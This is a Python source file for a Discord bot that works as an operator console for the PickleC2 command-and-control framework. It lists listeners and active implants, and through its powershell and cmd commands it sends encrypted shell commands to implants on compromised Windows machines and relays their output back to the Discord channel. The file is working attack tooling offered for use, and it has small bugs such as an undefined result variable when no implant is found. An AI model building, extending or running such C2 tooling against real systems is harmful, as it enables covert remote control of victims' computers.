#!/usr/bin/python3
import os
import sys
import discord
from discord.ext import commands

try:

	import sqlite3

except:

	print ("[-] Install sqlite3 lib\npython3 -m pip install sqlite3")
	exit()

try:
	from Core.database import list_listener
	from Core import encryption,database
	from Core.encryption import AESCipher

except:

	print ("[-] PickleC2-Bot must be in the same PickleC2 folder!")
	exit()
#--------------------------------------------------
#token

TOKEN = '' #Set your discord token

#--------------------------------------------------
#database

connector = sqlite3.connect("database.db")
connector.cursor()

#--------------------------------------------------
#command_prefix

client = commands.Bot(command_prefix = ">")
client.remove_command("help")


#--------------------------------------------------
#ready_event

@client.event
async def on_ready():

    print(f'{client.user.name} has connected to Discord!')


#--------------------------------------------------
#welcom_event

@client.event
async def on_member_join(member):

    await member.create_dm()
    await member.dm_channel.send(
        f'Hi {member.name}, welcome to PickleC2 Discord server!')


#--------------------------------------------------
#help_list
@client.group(invoke_without_command=True)
async def help(ctx):


    em = discord.Embed(colour = discord.Colour.green())
    em.add_field(name = ">help", value = "This discord bot will help you to interact with your target through PickleC2.",inline = False)
    em.add_field(name = ">help <option>", value = "You can list the help of these options.", inline = False)
    em.add_field(name = "listener", value = "You can list all the listener through >listener_list command.")
    em.add_field(name = "implant", value = "You can list all the implant through >implant_list command.")
    em.add_field(name = "interact", value = "You can interact with the implant.")

    await ctx.send(embed = em)



#--------------------------------------------------
#listener_list
@help.command()
async def listener(ctx):

    em = discord.Embed(colour = discord.Colour.green())

    em.add_field(name = "**Active**",value = ">listener_list")

    await ctx.send(embed = em)



#--------------------------------------------------
#implant_list
@help.command()
async def implant(ctx):

    em = discord.Embed(colour = discord.Colour.green())

    em.add_field(name = "**Active**",value = ">implant_list")

    await ctx.send(embed = em)



#--------------------------------------------------
#module_list

@help.command()
async def interact(ctx):

    em = discord.Embed(colour = discord.Colour.green())
    em.add_field(name = "**Interact**",value = "You can interact with the implant ex: >powershell/cmd <implant name> <command>", inline = False)
    em.add_field(name = "**powershell**",value = "Execute a powershell command ex: >powershell <implant name> <command>", inline = False)
    em.add_field(name = "**cmd**",value = "Execute a cmd command ex: >cmd <implant name> <command>", inline = False)

    await ctx.send(embed = em)

#--------------------------------------------------
#collect_listener_data

def listener_parser(data):

    listener_name = ""
    listener_ip  = ""
    listener_port = ""

    for i in range(0,len(data)):

        listener_name += "%s\n" % data[i][0]
        listener_ip += "%s\n" % data[i][1]
        listener_port += "%s\n" % data[i][2]

    return listener_name,listener_ip,listener_port

#--------------------------------------------------
#Active_Listeners

@client.command()
async def listener_list(ctx):

    res = connector.execute("SELECT Listener_Name,Listener_IP,Listener_Port FROM Listener")
    res = res.fetchall()

    em = discord.Embed(colour = discord.Colour.green())

    listener_name,listener_ip,listener_port = listener_parser(res)

    em.add_field(name = "Listener Name", value = listener_name)
    em.add_field(name = "Listener IP", value =listener_ip)
    em.add_field(name = "Listener Port", value = listener_port)

    await ctx.send(embed = em)

#--------------------------------------------------
#collect_implant_data

def implant_parser(data):

    implant_name = ""

    for i in range(0,len(data)):

        implant_name += "%s\n" % data[i][0]

    return implant_name

#--------------------------------------------------
#Active_Implant

@client.command()
async def implant_list(ctx):

    res = connector.execute("SELECT Implant_Name FROM Implant_Info WHERE Active='1'")
    res = res.fetchall()

    em = discord.Embed(colour = discord.Colour.green())

    implant_name= implant_parser(res)

    em.add_field(name = "Implant Name", value = implant_name)

    await ctx.send(embed = em)

#--------------------------------------------------
#collect_key_data

def key_parser(data):

    key = ""

    for i in range(0,len(data)):

        key += "%s\n" % data[i][0]

    return key

#--------------------------------------------------
#Execute Function

def execute_command(binary,command,name,key):

    if os.path.exists('data/implant/%s/result.dec' % name):
        os.remove('data/implant/%s/result.dec' % name)

    enc_command = encryption.EncryptString('%s %s' % (binary,command),key)
    save_command = open("data/implant/%s/tasks.enc" % name,"w")
    save_command.write(enc_command)
    save_command.close()

    flag = 1

    while (flag == 1):

        if os.path.exists('data/implant/%s/result.dec' % name):

            file = open("data/implant/%s/result.dec" % name,"r+").read()

            if file:

                flag = 0

    return file

#Powershell Handler

@client.command()
async def powershell(ctx, implant, command):

    em = discord.Embed(colour = discord.Colour.green())
    name = implant.split()[0]
    results = database.return_key(connector,name)
    key = key_parser(results)

    if results:

        em.add_field(name = "[*] %s Executing a powershell command" % name, value = command, inline = False)
        await ctx.send(embed = em)
        file = execute_command("powershell",command,name,key)

    else:

        em.add_field(name = "[-] %s Implant NOT FOUND!" % name, value = '...')


    await ctx.send("```\n[+] %s Results is returned\n\n%s\n```" % (name,file))

#CMD Handler

@client.command()
async def cmd(ctx, implant, command):

    em = discord.Embed(colour = discord.Colour.green())
    name = implant.split()[0]
    results = database.return_key(connector,name)
    key = key_parser(results)

    if results:

        em.add_field(name = "[*] %s Executing a cmd command" % name, value = command, inline = False)
        await ctx.send(embed = em)
        file = execute_command("cmd",command,name,key)

    else:

        em.add_field(name = "[-] %s Implant NOT FOUND!" % name, value = '...')


    await ctx.send("```\n[+] %s Results is returned\n\n%s\n```" % (name,file))

#--------------------------------------------------
client.run(TOKEN)
#--------------------------------------------------

